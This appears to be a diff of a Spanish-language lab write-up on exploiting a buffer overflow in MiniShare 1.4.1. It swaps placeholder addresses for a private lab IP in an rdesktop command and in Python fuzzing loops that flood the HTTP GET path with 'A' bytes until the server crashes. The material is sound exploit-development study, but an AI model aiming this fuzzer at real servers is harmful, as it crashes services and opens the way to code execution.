@@ -3,7 +3,7 @@
 Se procedera a realizar un desdoblamiento de buffer con el software MINISHARE 1.4.1 habrimos una ventana emergente al lado de nuestro tilix para poder trabajar, usamos el siguiente comando, colacando la IP de la maquina vulnerable.
 ***
 ``` 
-rdesktop " IP 192.168.a.b"  -u user -p paswword
+rdesktop 192.168.72.135 -u user -p paswword
 ```
 ****
 ### Screenshot
@@ -45,7 +45,7 @@ while True:
     FUZZ += "A" * 100
     print("Fuzzing with {} bytes".format(len(FUZZ)))
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    connect = s.connect(("192.168.a,b", 80))
+    connect = s.connect(("192.168.72.135", 80))
     # from a web proxy capturing the HTTP GET Request, we got this line "GET / HTTP/1.1" This is the vulnerable section
     s.send(b"GET " + FUZZ.encode() + b"HTTP/1.1\r\n\r\n")
     s.recv(1024)
@@ -79,7 +79,7 @@ FUZZ = "A" * 1800
 
 print("Fuzzing with {} bytes".format(len(FUZZ)))
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connect = s.connect(("192.168.a.b", 80))
+connect = s.connect(("192.168.72.135", 80))
 # from a web proxy capturing the HTTP GET Request, we got this line "GET / HTTP/1.1" This is the vulnerable section
 s.send(b"GET " + FUZZ.encode() + b"HTTP/1.1\r\n\r\n")
 s.recv(1024)
